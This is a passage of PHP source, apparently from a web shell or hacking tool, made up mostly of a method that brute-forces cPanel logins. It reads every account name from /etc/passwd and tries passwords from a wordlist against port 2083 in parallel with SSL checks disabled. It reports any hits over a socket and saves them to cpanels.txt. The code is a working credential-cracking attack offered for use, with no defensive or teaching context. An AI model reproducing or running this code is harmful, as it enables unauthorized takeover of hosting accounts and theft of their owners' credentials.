		ob_flush();flush();
		}
		curl_multi_remove_handle($multi,$cend);
		}
	}
	
	}
	
	}
	private function cpanel($wordlist,$socket)
	{
	fwrite($socket,"Starting cpanel crack..\n");
	ob_flush();flush();
	$open = file($wordlist);
	$userx= array();
	foreach($open as $pwd)
	{
	$pwd = trim($pwd);
	fwrite($socket,"Password ".$pwd." trying on all users\n");
	ob_flush();flush();
	$users= file('/etc/passwd');
	foreach($users as $user)
	{
	$user = trim($user);
	$user = explode(":",$user);
	$user = $user[0];
	$userx[] = $user;
	}
	$userx = array_filter($userx);
	$userx = array_unique($userx);
	$userx = array_chunk($userx,25);
	$multi = curl_multi_init();
	foreach($userx as $u)
	{
		for($i=0;$i<=count($u)-1;$i++)
		{
		$curl[$i] = curl_init();
		curl_setopt($curl[$i],CURLOPT_RETURNTRANSFER,1);
		curl_setopt($curl[$i],CURLOPT_URL,"https://$this->server_ip:2083/login/?login_only=1");
		curl_setopt($curl[$i],CURLOPT_POSTFIELDS,"user=".trim($u[$i])."&pass=$pwd");
		curl_setopt($curl[$i],CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($curl[$i],CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($curl[$i],CURLOPT_FOLLOWLOCATION,1);
		curl_setopt($curl[$i],CURLOPT_TIMEOUT,4);
		curl_multi_add_handle($multi,$curl[$i]);
		}
		do
		{
		curl_multi_exec($multi,$active);
		usleep(1);
		}while($active>0);
		foreach($curl as $cid => $cend)
		{
		$data[$cid] = curl_getinfo($cend);
		if($data[$cid]['http_code'] != 401)
		{
		fwrite($socket,"Found username: $u[$cid] , password: $pwd\n");
		print("<font color='red'>Found username: $u[$cid] , password: $pwd</font>\n");
		$save = $this->save_as("cpanels.txt","Found username: $u[$cid] , password: $pwd\r\n","ab");
		ob_flush();flush();
		}
		else
		{
		fwrite($socket,"Not found $u[$cid]:$pwd\n");
		print("Not found $u[$cid]:$pwd\n");
		ob_flush();flush();
		}
		curl_multi_remove_handle($multi,$cend);
		}
	}
	
	}
	
	}
	private function save_as($filename,$content,$type='ab')
	{
	$fopen = fopen($filename,$type);
	if($fopen)
	{
	fwrite($fopen,$content);
	fclose($fopen);
	return true;
	}
	else
	{
	return false;
	}
	
	}
}
?>